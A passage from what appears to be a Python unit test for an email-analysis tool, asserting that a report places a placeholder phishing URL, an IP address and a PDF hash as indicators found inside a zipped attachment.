        link = next(l for l in report["links"] if l["url"] == "https://login.phish.example/verify")
        assert link["contexts"] == ["inside attachment"]
        where = {i["value"]: i["where"] for i in report["iocs"]}
        assert where["45.9.1.2"] == ["inside attachment invoice.zip"]
        import hashlib
        assert where[hashlib.sha256(pdf).hexdigest()] == ["invoice.pdf inside attachment invoice.zip"]
